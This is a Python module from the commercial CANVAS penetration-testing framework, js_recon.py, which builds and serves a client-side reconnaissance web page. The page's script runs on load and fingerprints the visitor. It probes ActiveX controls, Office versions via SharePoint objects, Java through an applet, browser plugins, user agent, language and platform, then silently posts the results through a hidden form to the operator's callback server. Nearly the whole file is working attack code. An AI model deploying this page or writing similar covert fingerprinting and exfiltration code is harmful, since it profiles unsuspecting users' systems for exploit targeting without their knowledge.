##ImmunityHeader v1
###############################################################################
## File       :  js_recon.py
## Description:
##            :
## Created_On :  Wed Sep  2 12:47:52 2009
## Created_By :  Bas Alberts
## Modified_On:  Tue Dec 15 10:59:30 2009
## Modified_By:  Justin Seitz
## (c) Copyright 2009, Immunity Inc all rights reserved.
###############################################################################
#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2009
# http://www.immunityinc.com/CANVAS/ for more information

import os
import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from httpclientside import httpclientside

NAME                            = "js_recon"
DESCRIPTION                     = "Retrieves installed browser plugin info"
DOCUMENTATION                   = {}
DOCUMENTATION["Repeatability"]  = "Infinite (client side - no crash)"
DOCUMENTATION["CVE Name"]       = "N/A"
DOCUMENTATION["CVE Url"]        = "N/A"
DOCUMENTATION["References"]     = ""
DOCUMENTATION["Date public"]    = ""

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["UNIX"], ["Windows"] ]
PROPERTY['VERSION']             = []
PROPERTY['DELIVERY']            = 'HTTP'

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version            = 0
        self.name               = NAME
        self.htmlfile           = "index.html"
        # filename is used in the actual http server
        self.filename           = self.htmlfile
        self.postback           = 'PLUGINS'
        self.active_x_controls  = {}
        self.applet_file        = "Resources/DetectPluginVersion.class"
        self.applet             = "DetectPluginVersion.class"
        return

    def is_vulnerable(self, info_dict):
        """
        Yes, everyone is vulnerable to recon. :>
        """
        return 100


    def set_active_x_controls(self):
        # ActiveX dict is in the following format
        # active_x_controls['ActiveXGUID'] = [Name, Version, File]
        # Name    - Friendly name for report
        # Version - Specific Javascript method for determining the control's version. Use 'ax' as the
        #           ActiveX control instance
        # File    - the filename of the control
        self.active_x_controls['ShockwaveFlash.ShockwaveFlash'] = ["IE Flash","ax.GetVariable('$version');", ""]
        self.active_x_controls['AcroPDF.PDF']                   = ["IE Adobe Reader","ax.GetVersions();",""]
        self.active_x_controls['IERJCtl.IERJCtl.1']             = ["Real Player JukeBox","ax.RealJukeboxVersion;",""]
        self.active_x_controls['IERPCtl.IERPCtl.1']             = ["Real Player Plugin","'';",""]
        self.active_x_controls['WebViewFolderIcon.WebViewFolderIcon.1'] = ["IE WebView Folder Icon","'';",""]

    def build_java_detection(self,html):

        code_block = """
        try{
            var info = new Object();
            info['name'] = 'Java';
            info['file'] = '';

            document.write('<applet id=\"myApplet\" code=\"DetectPluginVersion.class\"></applet>');

            if(document.myApplet == null)
            {
                info['desc'] = 'Java not enabled.';
            }else{
                info['desc'] = 'Version: ' + document.myApplet.getJavaVersion() +' OS: ' + document.myApplet.getOs();
            }
            info_array.push(info);
            delete info;
        }catch(e){}

        """
        html = html.replace("$$$JAVACHECK$$$", code_block)
        # html = html.replace("$$$JAVACHECK$$$", "")
        return html

    def office_detection(self,html):
        code_block = """
        var info = new Object();
        info['name'] = 'Office';
        info['file'] = '';

        var ma = 1;
        var mb = 1;
        var mc = 1;
        var md = 1;
        try {
            ma = new ActiveXObject("SharePoint.OpenDocuments.4");
        } catch (e) {}
        try {
            mb = new ActiveXObject("SharePoint.OpenDocuments.3");
        } catch (e) {}
        try {
            mc = new ActiveXObject("SharePoint.OpenDocuments.2");
        } catch (e) {}
        try {
            md = new ActiveXObject("SharePoint.OpenDocuments.1");
        } catch (e) {}
        var a = typeof ma;
        var b = typeof mb;
        var c = typeof mc;
        var d = typeof md;
        info['desc'] = "No Office Found";
        if (a == "object" && b == "object" && c == "object" && d == "object") {
            info['desc'] = "Office 2010";
        }
        if (a == "number" && b == "object" && c == "object" && d == "object") {
            info['desc'] = "Office 2007";
            try {
                var ob2 = new ActiveXObject("SharePoint.OpenXMLDocuments");
                info['desc'] = "Office 2007 Plus";
            } catch (e) {}
        }
        if (a == "number" && b == "number" && c == "object" && d == "object") {
            info['desc'] = "Office 2003";
        }
        if (a == "number" && b == "number" && c == "number" && d == "object") {
            info['desc'] = "Office Xp";
        }
        info_array.push(info);
        delete info;
        """
        html = html.replace("$$$OFFICECHECK$$$", code_block)

        return html

    def build_ie_plugin_detection(self,html):

        code_block_activex = """
        try
        {
            var ax = new ActiveXObject('$GUID');
            var info = new Object();
            info['name'] = '$NAME';
            info['desc'] = $VERSION
            info['file'] = '$FILE';
            info_array.push(info);
            delete ax;
            delete info;
        } catch (e) {}
        """

        plugin_detection = ""

        for plugin in self.active_x_controls:

            current_plugin = code_block_activex

            current_plugin = current_plugin.replace("$GUID",    plugin)
            current_plugin = current_plugin.replace("$NAME",    self.active_x_controls[plugin][0])
            current_plugin = current_plugin.replace("$VERSION", self.active_x_controls[plugin][1])
            current_plugin = current_plugin.replace("$FILE",    self.active_x_controls[plugin][2])

            plugin_detection += current_plugin
            current_plugin    = ""

        html = html.replace("$$$PLUGINCHECK$$$", plugin_detection)

        return html

    def neededListenerTypes(self):
        return []

    def run(self):
        self.host       = self.target.interface
        self.htmlfile   = self.argsDict.get('htmlfile', self.htmlfile)
        html            = self.makefile()

        self.log("[+] Opening HTML %s for output" % self.htmlfile)
        fd = file(self.htmlfile, 'wb+')
        fd.write(html)
        fd.close()
        self.log("[+] wrote to %s" % self.htmlfile)
        return True

    ## SPIKE Proxy Callbacks ...

    def makefile(self):
        server_ip    = self.callback.ip
        server_port  = self.getServerPort()

        # Build our dict of ActiveX controls
        self.set_active_x_controls()

        # clientsideargs is for httpserver compatibility
        if hasattr(self, 'clientsideargs'):
            if self.clientsideargs['bindip'] != "0.0.0.0":
                server_ip   = self.clientsideargs['bindip']

            server_port = int(self.clientsideargs['bindport'])

            if 'domain' in self.clientsideargs:
                # for session cookie store consistency ...
                server_ip = self.clientsideargs['domain']

        uri = 'http://%s:%d' % (server_ip, server_port)

        if self.sessionstate:
            # here we go out to the clientd and get the baseURL the way we should.
            uri = self.sessionstate.loader.canvasobj.getBaseURL()

        postback = os.path.join(uri, self.postback)

        html = """
<html>
<head>
<script type="text/javascript">

function check_general_info(info_array)
{

    try{
        var info = new Object();
        info['name'] = 'CPU';
        info['desc'] = window.navigator.cpuClass;
        info['file'] = '';
        info_array.push(info);
        delete info;
    } catch (e) {}

    try{
        var info = new Object();
        info['name'] = 'AGENT';
        info['desc'] = window.navigator.userAgent;
        info['file'] = '';
        info_array.push(info);
        delete info;
    } catch (e) {}

}

function check_ie_plugins(info_array)
{

    $$$PLUGINCHECK$$$

    $$$JAVACHECK$$$

    $$$OFFICECHECK$$$

    return;
}

function check_browser_plugins(info_array)
{
    for (i = 0; i < navigator.plugins.length; i++)
    {
        try
        {

            if( navigator.plugins[i].name != 'Java' )
            {
            var info = new Object();
            info['name'] = navigator.plugins[i].name;
            info['desc'] = navigator.plugins[i].description;
            info['file'] = navigator.plugins[i].filename;
            try {
              info['version'] = navigator.plugins[i].version;
              } catch(e) {}
            info_array.push(info);
            }
        } catch (e) {}
    }

    try {
       var info = new Object();
       info['name'] = "Mimetype Acrobat Reader";
       info['desc'] = navigator.mimeTypes["application/pdf"].enabledPlugin.version;
       info['file'] = navigator.mimeTypes["application/pdf"].suffixes;
       info_array.push(info);
    } catch (e) {}
    return;
}

function get_language(info_array)
/* Get the language pack of the system*/
{
  var language = "";
  try {
   language = navigator.language ;
  }
  catch (err) {}
  try {
    language = navigator.systemLanguage;
  }
  catch (err) {}

  try {
    var info = new Object();
    info['name']='language';
    info['desc']=language;
    info['file']='';
    info_array.push(info);
  }
  catch (err) {}

  try {
     /*try to get platform here too*/
     var info = new Object();
     info['name'] ='platform';
     info['desc'] = navigator.platform;
     info['file'] = '';
     info_array.push(info);
  }
  catch (err) {}

}

function post_info(info_array)
{
    var form = document.createElement('form');
    form.method = "POST";
    form.action = '%(postback)s';

    for (var i = 0; i < info_array.length; i ++)
    {
        plugin = document.createElement('input');
        plugin.type = 'hidden';
        plugin.name = info_array[i]['name'];
        plugin.value = info_array[i]['desc'];
        form.appendChild(plugin)
    }

    document.body.appendChild(form);
    if (form.normalize)
        form.normalize();
    form.submit();
    document.body.removeChild(form);

    return;
}

function main()
{
    var info_array = new Array();

    check_general_info(info_array);
    check_browser_plugins(info_array);
    check_ie_plugins(info_array);
    get_language(info_array);
    post_info(info_array);

    return;
}

window.onload = main;

</script>
<body>
</body>
</html>
        """ % {'postback': postback}

        # Now we have to build a set of try/except code blocks to instantiate
        # the ActiveX controls
        html = self.build_ie_plugin_detection(html)
        html = self.build_java_detection(html)
        html = self.office_detection(html)

        return html

    def makesploit(self, clientheader, clientbody):
        # we are platform independent
        from libs.spkproxy import header, body
        h           = header('SERVER')
        b           = body()
        user_agent  = clientheader.getStrValue(['User-Agent'])

        self.log("[+] User agent of connecting host: %s" % user_agent)
        if clientheader.URL.count(self.htmlfile):
            self.log("[+] Sending HTML")
            b.setBody(self.makefile())
        elif clientheader.URL.count(self.applet):
            self.log("[+] Sending Applet")
            fd = open(self.applet_file,"rb")
            data = fd.read()
            fd.close()
            self.log("[+] Sending %d bytes" % len(data))
            h.addHeader('Content-type', 'binary/octet-stream')
            h.addHeader('Connection', 'close')
            b.setBody(data)
        elif clientheader.URL.count(self.postback):
            # check for server callback
            if hasattr(self, 'server_callback'):
                self.log("Saving discovered data to server_callback function")
                # pass info dict back to server_callback
                ret = self.server_callback(NAME, clientheader, clientbody)
            # all done
            self.log("Found plugin data - all done!")
            return None,None

        else:
            self.log("[+] Redirect to %s" % self.htmlfile)
            h.status = '302'
            h.addHeader('Location', self.htmlfile)
            h.addHeader('Content-Type', 'text/html')

        return h,b

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

